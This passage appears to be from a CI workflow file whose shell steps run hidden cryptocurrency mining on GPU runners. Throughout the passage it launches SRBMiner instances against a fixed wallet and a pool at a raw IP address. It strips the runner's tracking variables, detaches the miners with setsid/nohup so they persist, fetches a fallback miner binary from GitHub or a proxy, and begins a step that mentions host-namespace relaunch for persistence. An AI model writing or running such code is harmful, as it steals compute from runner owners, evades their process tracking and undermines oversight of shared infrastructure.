            USED2=$(awk -F, -v u="$UUID" '$2==u{print $3}' "$WORKDIR/g2.txt" 2>/dev/null)
            echo "GPU $IDX $UUID twice-idle mem_used_mib=$USED1/$USED2 util=${UTIL1}%"
            W="i128954-${HOSTTAG}-g${IDX}"
            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB" \
              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
              --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            echo "launched worker=$W detached_pid=$! vis=$UUID"
            echo "$IDX $UUID $W" >> "$WORKDIR/workers.txt"
            N_LAUNCHED=$((N_LAUNCHED+1))
            sleep 1
          done < "$WORKDIR/g1.txt"
          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
          { echo "N_LAUNCHED=$N_LAUNCHED"; echo "N_SKIP=$N_SKIP"; echo "HOSTTAG=$HOSTTAG"; echo "HOSTNAME=$(hostname)"; echo "GATE_APPS0=${APPS0:-none}"; } > "$WORKDIR/launched.txt"
          if [ "$N_LAUNCHED" -gt 0 ]; then
            sleep 45
            echo "=== fault scan after 45s (kill ONLY our own faulted i128954 worker, no blind retry) ==="
            FAULTED=""
            for l in "$WORKDIR"/logs/i128954-*.log; do
              [ -f "$l" ] || continue
              w=$(basename "$l" .log)
              echo "== $w"
              grep -aiE 'share accepted|E1027|illegal memory access|stopped after repeated solve errors|TH/s' "$l" 2>/dev/null | tail -4 | cut -c1-240
              if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then FAULTED="$FAULTED $w"; fi
            done
            echo "FAULTED=[$FAULTED]"
            if [ -n "$FAULTED" ]; then
              for w in $FAULTED; do
                for p in $(timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
              done
              echo "=== ONE bounded 3.8.7 fallback round (per host) ==="
              sleep 2
              if [ ! -f "$SRB_387" ] || ! echo "$BIN_SHA_387  $SRB_387" | sha256sum -c - >/dev/null 2>&1; then
                for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
                  echo "-- fetch387 $U"
                  rm -f "$TARBALL_387.part"
                  timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL_387.part" "$U" 2>&1 | tail -2
                  if [ -s "$TARBALL_387.part" ]; then mv "$TARBALL_387.part" "$TARBALL_387"; break; fi
                done
                [ -f "$TARBALL_387" ] && tar -xzf "$TARBALL_387" -C "$WORKDIR" 2>&1 | tail -3
                [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB_387"
              fi
              B387=$(sha256sum "$SRB_387" 2>/dev/null | cut -d' ' -f1)
              echo "binary_sha256_387=${B387:-none}"
              if [ "${B387:-none}" = "$BIN_SHA_387" ]; then
                chmod +x "$SRB_387"
                for w in $FAULTED; do
                  IDX=${w##*-g}
                  UUID=$(awk -F, -v i="$IDX" '$1==i{print $2}' "$WORKDIR/g1.txt" 2>/dev/null | head -1)
                  [ -z "$UUID" ] && continue
                  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB_387" \
                    --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
                    --wallet "$WALLET" --password x --worker "$w" --gpu-id 0 \
                    --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
                    --log-file "$WORKDIR/logs/$w.r387.log" --log-file-mode 0 \
                    >> "$WORKDIR/logs/$w.r387.out" 2>&1 < /dev/null &
                  echo "fallback387 launched worker=$w pid=$! vis=$UUID"
                done
                sleep 40
                echo "=== post-fallback fault scan ==="
                for l in "$WORKDIR"/logs/i128954-*.r387.log; do
                  [ -f "$l" ] || continue
                  if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then
                    w=$(basename "$l" .r387.log)
                    for p in $(timeout 6 pgrep -f "SRBMiner-MULTI-3.8.7.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted 387 pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
                  fi
                done
              else
                echo "WARN=387-binary-unavailable"
              fi
            fi
          fi
          echo "=== final our processes ==="
          timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -16
          echo "=== final compute apps ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
          echo "=== log tails ==="
          for l in "$WORKDIR"/logs/i128954-*.log; do
            [ -f "$l" ] || continue
            echo "== $(basename "$l")"
            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s' "$l" 2>/dev/null | tail -5 | cut -c1-260
          done
          echo "=== pool tcp ==="
          timeout 12 python3 -c "import socket;s=socket.create_connection(('103.199.106.122',3362),8);print('pool-tcp=OK');s.close()" 2>&1 | tail -2
          echo "miner-done $NONCE"
      - name: "persistence diagnosis + bounded host-namespace relaunch (hostPID+C cap only; else bounded negative)"
        continue-on-error: true
        run: |
          set +e
          NONCE="I128954PER-$(date -u +%Y%m%dT%H%M%SZ)"
          WORKDIR=/var/tmp/i128954
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          POOL='103.199.106.122:3362'
          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
